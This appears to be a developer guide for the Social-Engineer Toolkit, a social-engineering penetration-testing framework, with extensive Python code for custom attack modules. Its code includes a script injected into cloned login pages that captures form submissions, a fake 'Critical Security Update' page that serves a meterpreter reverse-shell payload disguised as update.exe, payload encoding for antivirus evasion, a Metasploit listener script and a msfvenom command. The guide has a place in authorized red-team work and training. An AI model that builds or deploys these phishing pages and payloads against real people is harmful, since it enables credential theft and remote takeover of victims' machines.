# SET Developer Guide

## Table of Contents

1. [Development Environment Setup](#development-environment-setup)
2. [Architecture Overview](#architecture-overview)
3. [Creating Custom Modules](#creating-custom-modules)
4. [Extending Core Functionality](#extending-core-functionality)
5. [Adding New Attack Vectors](#adding-new-attack-vectors)
6. [Testing and Debugging](#testing-and-debugging)
7. [Contributing Guidelines](#contributing-guidelines)
8. [API Integration Examples](#api-integration-examples)

## Development Environment Setup

### Prerequisites

```bash
# System requirements
- Python 3.6+ (with Python 2.7 compatibility)
- Git for version control
- Virtual environment support
- Root/Administrator privileges for testing

# Development tools
- Code editor with Python support
- Debugger (pdb, IDE debugger)
- Network testing tools (netcat, nmap)
- Metasploit Framework (for payload testing)
```

### Development Installation

```bash
# Clone development repository
git clone https://github.com/trustedsec/social-engineer-toolkit.git set-dev
cd set-dev

# Create development environment
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate     # Windows

# Install dependencies
pip install -r requirements.txt
pip install -r requirements-dev.txt  # If available

# Install in development mode
python setup.py develop
```

### Development Configuration

```bash
# Create development config
cp src/core/config.baseline /etc/setoolkit/set.config.dev

# Edit development settings
nano /etc/setoolkit/set.config.dev

# Key development settings:
DEBUG_MODE=ON
LOG_LEVEL=DEBUG
WEBATTACK_PORT=8080  # Non-privileged port for testing
AUTO_DETECT=OFF      # Manual IP for controlled testing
```

## Architecture Overview

### Core Components

```
SET Architecture:
├── Main Entry Point (setoolkit)
├── Core Framework (src/core/)
│   ├── setcore.py          # Core functions
│   ├── menu/text.py        # Menu definitions
│   ├── module_handler.py   # Third-party module loader
│   └── config management
├── Attack Modules (src/)
│   ├── webattack/          # Web-based attacks
│   ├── phishing/           # Email attacks
│   ├── payloads/           # Payload generation
│   ├── teensy/             # HID attacks
│   └── wireless/           # Wireless attacks
└── Third-Party (modules/)
    └── Custom modules
```

### Data Flow

```python
# Typical SET execution flow:
1. setoolkit (entry point)
   ↓
2. src/core/setcore.py (initialization)
   ↓
3. Menu system (src/core/menu/text.py)
   ↓
4. Attack module selection
   ↓
5. Module execution (src/[attack_type]/)
   ↓
6. Payload generation (if needed)
   ↓
7. Attack deployment
   ↓
8. Result collection
   ↓
9. Cleanup (cleanup_routine())
```

### Configuration System

```python
# Configuration hierarchy:
1. Default config (src/core/config.baseline)
2. System config (/etc/setoolkit/set.config)
3. User config (~/.set/)
4. Runtime options (update_options())

# Configuration access:
from src.core.setcore import check_config, update_options

# Read configuration
value = check_config("PARAMETER_NAME=")

# Update configuration
update_options("PARAMETER_NAME=new_value")
```

## Creating Custom Modules

### Basic Module Structure

```python
#!/usr/bin/env python3
# modules/custom_attack.py

# Required: Module description for menu display
MAIN = "Custom Attack Module - Description of what it does"

# Required: Main function called when module is selected
def main():
    """
    Main entry point for the custom module
    """
    # Import SET core functions
    from src.core.setcore import *
    
    print_status("Starting custom attack module")
    
    # Get user input
    target = input(setprompt(["custom"], "Enter target IP"))
    
    # Validate input
    if not validate_ip(target):
        print_error("Invalid IP address")
        return
    
    # Execute attack logic
    execute_custom_attack(target)
    
    print_status("Custom attack completed")
    return_continue()

def execute_custom_attack(target):
    """
    Custom attack implementation
    """
    # Attack logic here
    print_info(f"Attacking target: {target}")
    
    # Example: Network reconnaissance
    import subprocess
    result = subprocess.run(['nmap', '-sS', target], 
                          capture_output=True, text=True)
    
    if result.returncode == 0:
        print_status("Scan completed successfully")
        print(result.stdout)
    else:
        print_error("Scan failed")
        print(result.stderr)

# Optional: Helper functions
def validate_target(target):
    """
    Custom validation logic
    """
    return validate_ip(target) and target != "127.0.0.1"

# Optional: Configuration
def configure_attack():
    """
    Attack-specific configuration
    """
    config = {}
    config['timeout'] = input("Enter timeout (seconds): ")
    config['threads'] = input("Enter number of threads: ")
    return config
```

### Advanced Module Features

#### Integration with SET Core

```python
# modules/advanced_module.py

MAIN = "Advanced Attack Module with SET Integration"

def main():
    from src.core.setcore import *
    import os
    
    # Use SET's configuration system
    auto_detect = check_config("AUTO_DETECT=")
    if auto_detect == "ON":
        local_ip = detect_public_ip()
    else:
        local_ip = grab_ipaddress()
    
    # Update SET options
    update_options(f"IPADDR={local_ip}")
    
    # Use SET's web server
    attack_dir = prepare_attack_files()
    start_web_server(attack_dir)
    
    # Use SET's payload generation
    payload_path = generate_custom_payload(local_ip, "4444")
    
    print_status(f"Attack server running on {local_ip}")
    print_info(f"Payload available at: {payload_path}")

def prepare_attack_files():
    """
    Prepare attack files using SET utilities
    """
    from src.core.setcore import setdir, copyfolder
    
    # Get user SET directory
    user_dir = setdir()
    attack_dir = os.path.join(user_dir, "custom_attack")
    
    # Create attack directory
    if not os.path.exists(attack_dir):
        os.makedirs(attack_dir)
    
    # Copy template files
    template_dir = "src/templates/custom"
    if os.path.exists(template_dir):
        copyfolder(template_dir, attack_dir)
    
    return attack_dir

def generate_custom_payload(lhost, lport):
    """
    Generate payload using SET's payload system
    """
    from src.core.setcore import generate_shellcode
    
    # Generate shellcode
    shellcode = generate_shellcode("windows/meterpreter/reverse_tcp", 
                                  lhost, lport)
    
    # Save to file
    payload_file = "/tmp/custom_payload.exe"
    with open(payload_file, "wb") as f:
        f.write(shellcode)
    
    return payload_file
```

#### Module with Menu System

```python
# modules/menu_module.py

MAIN = "Module with Custom Menu System"

def main():
    from src.core.setcore import *
    
    while True:
        show_custom_menu()
        choice = input(setprompt(["custom"], ""))
        
        if choice == "1":
            attack_option_1()
        elif choice == "2":
            attack_option_2()
        elif choice == "3":
            configure_module()
        elif choice == "99":
            break
        else:
            print_error("Invalid selection")

def show_custom_menu():
    """
    Display custom module menu
    """
    from src.core.setcore import print_info_spaces
    
    print("\n" + "="*50)
    print("   Custom Attack Module Menu")
    print("="*50)
    print_info_spaces("1. Network Reconnaissance")
    print_info_spaces("2. Vulnerability Scan") 
    print_info_spaces("3. Configure Settings")
    print_info_spaces("99. Return to Main Menu")
    print()

def attack_option_1():
    """
    Network reconnaissance attack
    """
    print_status("Starting network reconnaissance...")
    # Implementation here

def attack_option_2():
    """
    Vulnerability scanning attack
    """
    print_status("Starting vulnerability scan...")
    # Implementation here

def configure_module():
    """
    Module configuration
    """
    print_status("Module configuration...")
    # Configuration logic here
```

## Extending Core Functionality

### Adding New Core Functions

```python
# src/core/custom_core.py

from src.core.setcore import *

def advanced_site_cloner(url, output_dir, custom_options=None):
    """
    Enhanced website cloning with additional features
    
    Args:
        url (str): Target URL to clone
        output_dir (str): Output directory for cloned files
        custom_options (dict): Additional cloning options
    
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        print_status(f"Cloning website: {url}")
        
        # Enhanced cloning logic
        if custom_options:
            if custom_options.get('deep_clone'):
                clone_with_depth(url, output_dir, depth=3)
            if custom_options.get('modify_forms'):
                inject_form_handlers(output_dir)
        else:
            # Use standard cloning
            site_cloner(url, output_dir)
        
        print_status("Website cloning completed")
        return True
        
    except Exception as e:
        print_error(f"Cloning failed: {str(e)}")
        log(e)
        return False

def clone_with_depth(url, output_dir, depth=2):
    """
    Clone website with specified depth
    """
    import requests
    from urllib.parse import urljoin, urlparse
    import os
    
    visited = set()
    to_visit = [(url, 0)]
    
    while to_visit:
        current_url, current_depth = to_visit.pop(0)
        
        if current_depth > depth or current_url in visited:
            continue
            
        visited.add(current_url)
        
        try:
            response = requests.get(current_url)
            if response.status_code == 200:
                # Save page content
                save_cloned_page(current_url, response.content, output_dir)
                
                # Extract and queue links if within depth limit
                if current_depth < depth:
                    links = extract_links(response.content, current_url)
                    for link in links:
                        to_visit.append((link, current_depth + 1))
                        
        except Exception as e:
            print_warning(f"Failed to clone {current_url}: {str(e)}")

def inject_form_handlers(output_dir):
    """
    Inject credential harvesting into cloned forms
    """
    import glob
    import re
    
    html_files = glob.glob(os.path.join(output_dir, "*.html"))
    
    for html_file in html_files:
        with open(html_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Inject harvesting script
        harvesting_script = '''
        <script>
        document.addEventListener('submit', function(e) {
            var formData = new FormData(e.target);
            var data = {};
            for (var [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            // Send to harvester
            fetch('/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        });
        </script>
        '''
        
        # Insert before closing body tag
        content = content.replace('</body>', harvesting_script + '</body>')
        
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(content)

def enhanced_payload_generator(payload_type, options):
    """
    Enhanced payload generation with evasion techniques
    
    Args:
        payload_type (str): Type of payload to generate
        options (dict): Payload options and evasion settings
    
    Returns:
        str: Path to generated payload
    """
    from src.core.setcore import generate_shellcode, setdir
    import tempfile
    
    print_status(f"Generating enhanced {payload_type} payload")
    
    # Generate base payload
    base_shellcode = generate_shellcode(
        payload_type, 
        options['lhost'], 
        options['lport']
    )
    
    # Apply evasion techniques
    if options.get('encode'):
        encoded_shellcode = encode_payload(base_shellcode, options['encoder'])
    else:
        encoded_shellcode = base_shellcode
    
    if options.get('encrypt'):
        encrypted_shellcode = encrypt_payload(encoded_shellcode, options['key'])
    else:
        encrypted_shellcode = encoded_shellcode
    
    # Generate final payload file
    payload_path = create_payload_wrapper(encrypted_shellcode, options)
    
    print_status(f"Enhanced payload created: {payload_path}")
    return payload_path

def encode_payload(shellcode, encoder_type):
    """
    Encode payload for AV evasion
    """
    print_info(f"Encoding payload with {encoder_type}")
    
    if encoder_type == "base64":
        import base64
        return base64.b64encode(shellcode)
    elif encoder_type == "xor":
        key = 0xAA
        return bytes([b ^ key for b in shellcode])
    else:
        return shellcode

def create_payload_wrapper(shellcode, options):
    """
    Create executable wrapper for payload
    """
    import tempfile
    import os
    
    # Create temporary file
    fd, temp_path = tempfile.mkstemp(suffix='.exe')
    
    try:
        # Generate wrapper code
        wrapper_code = generate_wrapper_code(shellcode, options)
        
        # Compile wrapper (simplified example)
        compile_wrapper(wrapper_code, temp_path)
        
        return temp_path
        
    except Exception as e:
        os.unlink(temp_path)
        raise e
```

### Custom Web Attack Vector

```python
# src/webattack/custom_attack/main.py

from src.core.setcore import *
import http.server
import socketserver
import threading
import json

class CustomAttackHandler(http.server.BaseHTTPRequestHandler):
    """
    Custom HTTP handler for web attacks
    """
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/':
            self.serve_attack_page()
        elif self.path == '/payload':
            self.serve_payload()
        else:
            self.send_error(404)
    
    def do_POST(self):
        """Handle POST requests (credential capture)"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Log captured data
        self.log_captured_data(post_data)
        
        # Send response
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()
    
    def serve_attack_page(self):
        """Serve the main attack page"""
        html_content = self.generate_attack_html()
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode())
    
    def serve_payload(self):
        """Serve malicious payload"""
        payload_path = check_options("PAYLOAD_PATH=")
        
        if os.path.exists(payload_path):
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-Disposition', 'attachment; filename="update.exe"')
            self.end_headers()
            self.wfile.write(payload_data)
        else:
            self.send_error(404)
    
    def generate_attack_html(self):
        """Generate HTML for attack page"""
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Update Required</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 50px; }
                .warning { background: #ffebee; border: 1px solid #f44336; padding: 20px; }
                .button { background: #2196F3; color: white; padding: 10px 20px; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="warning">
                <h2>Critical Security Update Required</h2>
                <p>Your system requires an immediate security update to protect against recent vulnerabilities.</p>
                <button class="button" onclick="downloadUpdate()">Download Update</button>
            </div>
            
            <script>
                function downloadUpdate() {
                    window.location.href = '/payload';
                }
            </script>
        </body>
        </html>
        """
    
    def log_captured_data(self, data):
        """Log captured credentials/data"""
        try:
            # Parse form data
            parsed_data = self.parse_post_data(data)
            
            # Log to SET's logging system
            timestamp = date_time()
            log_entry = f"[{timestamp}] Custom Attack - Data Captured: {parsed_data}"
            
            # Write to log file
            log_file = os.path.join(setdir(), "custom_attack.log")
            with open(log_file, 'a') as f:
                f.write(log_entry + "\n")
            
            # Display to console
            print_status("Data captured from victim")
            for key, value in parsed_data.items():
                print_info(f"{key}: {value}")
                
        except Exception as e:
            log(e)
    
    def parse_post_data(self, data):
        """Parse POST data into dictionary"""
        import urllib.parse
        
        try:
            # Try to parse as form data
            parsed = urllib.parse.parse_qs(data.decode())
            return {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
        except:
            # Try to parse as JSON
            try:
                return json.loads(data.decode())
            except:
                return {"raw_data": data.decode()}

def launch_custom_attack():
    """
    Main function to launch custom web attack
    """
    print_status("Launching custom web attack")
    
    # Get configuration
    listen_ip = check_options("IPADDR=")
    if listen_ip == "0":
        listen_ip = grab_ipaddress()
        update_options(f"IPADDR={listen_ip}")
    
    listen_port = int(check_config("WEBATTACK_PORT=") or "8080")
    
    # Generate payload if needed
    payload_choice = yesno_prompt("0", "Generate payload for download [yes|no]")
    if payload_choice == "YES":
        payload_path = generate_attack_payload(listen_ip)
        update_options(f"PAYLOAD_PATH={payload_path}")
    
    # Start web server
    try:
        httpd = socketserver.TCPServer((listen_ip, listen_port), CustomAttackHandler)
        
        print_status(f"Custom attack server started on {listen_ip}:{listen_port}")
        print_info(f"Attack URL: http://{listen_ip}:{listen_port}")
        
        # Start server in thread
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        print_status("Press Ctrl+C to stop the attack")
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_status("Stopping custom attack server")
            httpd.shutdown()
            
    except Exception as e:
        print_error(f"Failed to start attack server: {str(e)}")
        log(e)

def generate_attack_payload(lhost):
    """
    Generate payload for the attack
    """
    from src.core.payloadgen.solo import payload_generate
    
    print_status("Generating attack payload")
    
    # Payload options
    payload_type = "windows/meterpreter/reverse_tcp"
    lport = "4444"
    
    # Generate payload
    payload_path = payload_generate(payload_type, lhost, lport)
    
    print_status(f"Payload generated: {payload_path}")
    return payload_path

# Main entry point for the attack module
def main():
    """
    Main entry point for custom web attack
    """
    launch_custom_attack()
```

## Adding New Attack Vectors

### Attack Vector Template

```python
# src/[attack_category]/[attack_name]/main.py

from src.core.setcore import *
import os
import sys

def main():
    """
    Main entry point for new attack vector
    """
    print_status("Starting [Attack Name] attack vector")
    
    # Configuration phase
    config = configure_attack()
    
    # Validation phase
    if not validate_configuration(config):
        print_error("Invalid configuration")
        return
    
    # Preparation phase
    if not prepare_attack(config):
        print_error("Attack preparation failed")
        return
    
    # Execution phase
    execute_attack(config)
    
    # Cleanup phase
    cleanup_attack(config)

def configure_attack():
    """
    Configure attack parameters
    """
    config = {}
    
    # Get target information
    config['target'] = input(setprompt(["attack"], "Enter target"))
    
    # Get attack options
    config['option1'] = yesno_prompt("attack", "Enable option 1 [yes|no]")
    config['option2'] = input(setprompt(["attack"], "Enter option 2"))
    
    # Get network configuration
    config['lhost'] = check_options("IPADDR=")
    if config['lhost'] == "0":
        config['lhost'] = grab_ipaddress()
        update_options(f"IPADDR={config['lhost']}")
    
    config['lport'] = input(setprompt(["attack"], "Enter listening port [4444]"))
    if not config['lport']:
        config['lport'] = "4444"
    
    return config

def validate_configuration(config):
    """
    Validate attack configuration
    """
    # Validate target
    if not config['target']:
        print_error("Target cannot be empty")
        return False
    
    # Validate IP address
    if not validate_ip(config['lhost']):
        print_error("Invalid IP address")
        return False
    
    # Validate port
    try:
        port = int(config['lport'])
        if port < 1 or port > 65535:
            print_error("Port must be between 1 and 65535")
            return False
    except ValueError:
        print_error("Port must be a number")
        return False
    
    return True

def prepare_attack(config):
    """
    Prepare attack files and resources
    """
    try:
        print_status("Preparing attack resources")
        
        # Create working directory
        work_dir = os.path.join(setdir(), "attack_work")
        if not os.path.exists(work_dir):
            os.makedirs(work_dir)
        
        config['work_dir'] = work_dir
        
        # Generate required files
        generate_attack_files(config)
        
        # Setup network resources
        setup_network_resources(config)
        
        print_status("Attack preparation completed")
        return True
        
    except Exception as e:
        print_error(f"Attack preparation failed: {str(e)}")
        log(e)
        return False

def generate_attack_files(config):
    """
    Generate attack-specific files
    """
    # Generate payload if needed
    if config.get('generate_payload'):
        payload_path = generate_shellcode(
            "windows/meterpreter/reverse_tcp",
            config['lhost'],
            config['lport']
        )
        config['payload_path'] = payload_path
    
    # Generate attack scripts
    script_content = create_attack_script(config)
    script_path = os.path.join(config['work_dir'], "attack_script.py")
    
    with open(script_path, 'w') as f:
        f.write(script_content)
    
    config['script_path'] = script_path

def setup_network_resources(config):
    """
    Setup network resources for attack
    """
    # Setup web server if needed
    if config.get('use_web_server'):
        start_web_server(config['work_dir'])
    
    # Setup listeners if needed
    if config.get('setup_listener'):
        setup_metasploit_listener(config)

def execute_attack(config):
    """
    Execute the attack
    """
    print_status("Executing attack")
    
    try:
        # Attack implementation here
        attack_result = perform_attack_logic(config)
        
        if attack_result:
            print_status("Attack executed successfully")
            display_results(attack_result)
        else:
            print_warning("Attack completed with no results")
            
    except KeyboardInterrupt:
        print_warning("Attack interrupted by user")
    except Exception as e:
        print_error(f"Attack execution failed: {str(e)}")
        log(e)

def perform_attack_logic(config):
    """
    Core attack logic implementation
    """
    # Implement specific attack logic here
    # This will vary based on the attack type
    
    results = {
        'target': config['target'],
        'timestamp': date_time(),
        'success': True,
        'data': []
    }
    
    return results

def display_results(results):
    """
    Display attack results
    """
    print_status("Attack Results:")
    print_info(f"Target: {results['target']}")
    print_info(f"Timestamp: {results['timestamp']}")
    print_info(f"Success: {results['success']}")
    
    if results['data']:
        print_info("Captured Data:")
        for item in results['data']:
            print_info_spaces(f"- {item}")

def cleanup_attack(config):
    """
    Cleanup attack resources
    """
    print_status("Cleaning up attack resources")
    
    try:
        # Stop web servers
        # Kill processes
        # Remove temporary files
        
        if 'work_dir' in config and os.path.exists(config['work_dir']):
            import shutil
            shutil.rmtree(config['work_dir'])
        
        print_status("Cleanup completed")
        
    except Exception as e:
        print_warning(f"Cleanup failed: {str(e)}")
        log(e)

def setup_metasploit_listener(config):
    """
    Setup Metasploit listener for payloads
    """
    print_status("Setting up Metasploit listener")
    
    # Create resource script
    resource_script = f"""
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {config['lhost']}
set LPORT {config['lport']}
exploit -j
"""
    
    # Write resource script
    script_path = os.path.join(config['work_dir'], "listener.rc")
    with open(script_path, 'w') as f:
        f.write(resource_script)
    
    # Start Metasploit
    import subprocess
    subprocess.Popen(['msfconsole', '-r', script_path])
    
    print_info(f"Metasploit listener started on {config['lhost']}:{config['lport']}")

def create_attack_script(config):
    """
    Create attack-specific script content
    """
    script_template = f"""#!/usr/bin/env python3
# Auto-generated attack script

import sys
import os

def main():
    print("Executing attack against {config['target']}")
    
    # Attack logic here
    
if __name__ == "__main__":
    main()
"""
    
    return script_template
```

## Testing and Debugging

### Unit Testing Framework

```python
# tests/test_core_functions.py

import unittest
import sys
import os

# Add SET to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from src.core.setcore import *

class TestCoreFunctions(unittest.TestCase):
    """Test cases for SET core functions"""
    
    def setUp(self):
        """Setup test environment"""
        self.test_ip = "192.168.1.100"
        self.test_url = "http://example.com"
        
    def test_validate_ip(self):
        """Test IP validation function"""
        # Valid IPv4
        self.assertTrue(validate_ip("192.168.1.1"))
        self.assertTrue(validate_ip("10.0.0.1"))
        
        # Invalid IPv4
        self.assertFalse(validate_ip("256.1.1.1"))
        self.assertFalse(validate_ip("192.168.1"))
        
        # Valid IPv6
        self.assertTrue(validate_ip("2001:0db8:85a3:0000:0000:8a2e:0370:7334"))
        
        # Invalid formats
        self.assertFalse(validate_ip("not.an.ip"))
        self.assertFalse(validate_ip(""))
    
    def test_generate_random_string(self):
        """Test random string generation"""
        # Test length constraints
        result = generate_random_string(5, 10)
        self.assertGreaterEqual(len(result), 5)
        self.assertLessEqual(len(result), 10)
        
        # Test character set (alphanumeric only)
        self.assertTrue(result.isalnum())
        
        # Test uniqueness (probabilistic)
        result1 = generate_random_string(10, 10)
        result2 = generate_random_string(10, 10)
        self.assertNotEqual(result1, result2)
    
    def test_check_os(self):
        """Test OS detection"""
        os_type = check_os()
        self.assertIn(os_type, ["posix", "windows"])
    
    def test_configuration_functions(self):
        """Test configuration management"""
        # Test update and check
        test_option = "TEST_PARAM=test_value"
        update_options(test_option)
        
        result = check_options("TEST_PARAM=")
        self.assertEqual(result, "test_value")

class TestWebFunctions(unittest.TestCase):
    """Test cases for web-related functions"""
    
    def test_site_cloner_validation(self):
        """Test site cloner input validation"""
        # This would test the validation logic
        # without actually performing network operations
        pass
    
    def test_payload_generation(self):
        """Test payload generation functions"""
        # Mock payload generation for testing
        pass

class TestModuleSystem(unittest.TestCase):
    """Test cases for module system"""
    
    def test_module_loading(self):
        """Test third-party module loading"""
        # Test module discovery and loading
        pass
    
    def test_module_validation(self):
        """Test module validation"""
        # Test that modules have required components
        pass

if __name__ == '__main__':
    # Run tests
    unittest.main()
```

### Debug Configuration

```python
# src/core/debug.py

import logging
import os
from src.core.setcore import setdir, date_time

# Configure debug logging
def setup_debug_logging():
    """
    Setup comprehensive debug logging
    """
    log_dir = os.path.join(setdir(), "debug_logs")
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    log_file = os.path.join(log_dir, f"set_debug_{date_time().replace(':', '-')}.log")
    
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()  # Also log to console
        ]
    )
    
    return logging.getLogger('SET')

# Debug decorator
def debug_function(func):
    """
    Decorator to add debug logging to functions
    """
    def wrapper(*args, **kwargs):
        logger = logging.getLogger('SET')
        logger.debug(f"Calling {func.__name__} with args: {args}, kwargs: {kwargs}")
        
        try:
            result = func(*args, **kwargs)
            logger.debug(f"{func.__name__} returned: {result}")
            return result
        except Exception as e:
            logger.error(f"{func.__name__} raised exception: {str(e)}")
            raise
    
    return wrapper

# Performance monitoring
def monitor_performance(func):
    """
    Decorator to monitor function performance
    """
    import time
    
    def wrapper(*args, **kwargs):
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        
        execution_time = end_time - start_time
        logger = logging.getLogger('SET')
        logger.info(f"{func.__name__} executed in {execution_time:.4f} seconds")
        
        return result
    
    return wrapper

# Usage example:
@debug_function
@monitor_performance
def enhanced_site_cloner(url, output_dir):
    """
    Example of using debug decorators
    """
    # Function implementation
    pass
```

### Integration Testing

```python
# tests/integration_test.py

import subprocess
import time
import requests
import os

class SetIntegrationTest:
    """
    Integration tests for SET functionality
    """
    
    def __init__(self):
        self.set_path = "/path/to/setoolkit"
        self.test_port = 8888
        
    def test_credential_harvester(self):
        """
        Test credential harvester functionality
        """
        print("Testing credential harvester...")
        
        # Start SET with automation
        automation_script = f"""
use 1
use 2
use 3
use 2
http://example.com
127.0.0.1
{self.test_port}
"""
        
        with open('/tmp/test_automation.txt', 'w') as f:
            f.write(automation_script)
        
        # Start SET process
        set_process = subprocess.Popen([
            'sudo', self.set_path,
            '--automation', '/tmp/test_automation.txt'
        ])
        
        # Wait for server to start
        time.sleep(10)
        
        # Test server response
        try:
            response = requests.get(f'http://127.0.0.1:{self.test_port}')
            assert response.status_code == 200
            print("✓ Credential harvester server started successfully")
            
            # Test form submission
            form_data = {'username': 'test', 'password': 'test123'}
            post_response = requests.post(f'http://127.0.0.1:{self.test_port}', 
                                        data=form_data)
            print("✓ Form submission test completed")
            
        except Exception as e:
            print(f"✗ Test failed: {str(e)}")
        finally:
            # Cleanup
            set_process.terminate()
            os.unlink('/tmp/test_automation.txt')
    
    def test_payload_generation(self):
        """
        Test payload generation
        """
        print("Testing payload generation...")
        
        # Test msfvenom integration
        try:
            result = subprocess.run([
                'msfvenom', '-p', 'windows/meterpreter/reverse_tcp',
                'LHOST=127.0.0.1', 'LPORT=4444',
                '-f', 'exe', '-o', '/tmp/test_payload.exe'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                print("✓ Payload generation successful")
                # Cleanup
                if os.path.exists('/tmp/test_payload.exe'):
                    os.unlink('/tmp/test_payload.exe')
            else:
                print(f"✗ Payload generation failed: {result.stderr}")
                
        except FileNotFoundError:
            print("✗ msfvenom not found - Metasploit not installed")
    
    def run_all_tests(self):
        """
        Run all integration tests
        """
        print("Starting SET Integration Tests...")
        print("="*50)
        
        self.test_credential_harvester()
        self.test_payload_generation()
        
        print("="*50)
        print("Integration tests completed")

if __name__ == "__main__":
    tester = SetIntegrationTest()
    tester.run_all_tests()
```

## Contributing Guidelines

### Code Style Standards

```python
# Follow PEP 8 with SET-specific conventions

# 1. Import organization
import os
import sys
import time
# Standard library imports first

import requests
import pexpect
# Third-party imports second

from src.core.setcore import *
# SET imports last

# 2. Function documentation
def example_function(param1, param2=None):
    """
    Brief description of function purpose.
    
    Args:
        param1 (str): Description of param1
        param2 (str, optional): Description of param2
    
    Returns:
        bool: Description of return value
    
    Raises:
        ValueError: When param1 is invalid
        
    Example:
        >>> result = example_function("test")
        >>> print(result)
        True
    """
    pass

# 3. Error handling
try:
    risky_operation()
except SpecificException as e:
    print_error(f"Specific error occurred: {str(e)}")
    log(e)
    return False
except Exception as e:
    print_error(f"Unexpected error: {str(e)}")
    log(e)
    return False

# 4. Configuration usage
config_value = check_config("PARAMETER=")
if config_value != "0":
    # Use configuration value
    pass
else:
    # Handle missing configuration
    pass
```

### Pull Request Process

```bash
# 1. Fork and clone repository
git clone https://github.com/yourusername/social-engineer-toolkit.git
cd social-engineer-toolkit

# 2. Create feature branch
git checkout -b feature/new-attack-vector

# 3. Make changes with proper commits
git add .
git commit -m "Add new attack vector for XYZ

- Implement core attack logic
- Add configuration options
- Include error handling
- Add documentation"

# 4. Test changes thoroughly
python -m pytest tests/
./run_integration_tests.sh

# 5. Update documentation
# Update relevant .md files
# Add function documentation
# Include usage examples

# 6. Submit pull request
git push origin feature/new-attack-vector
# Create PR through GitHub interface
```

### Documentation Requirements

```markdown
# For new features, include:

## 1. Function Documentation
- Purpose and behavior
- Parameter descriptions
- Return value details
- Usage examples
- Error conditions

## 2. Module Documentation
- Overview of functionality
- Configuration requirements
- Dependencies
- Integration points

## 3. User Documentation
- Step-by-step usage guide
- Configuration instructions
- Troubleshooting tips
- Security considerations

## 4. Developer Documentation
- Architecture decisions
- Extension points
- Testing procedures
- Performance considerations
```

---

*This developer guide provides the foundation for extending and contributing to SET. Follow these patterns and guidelines to maintain code quality and consistency.*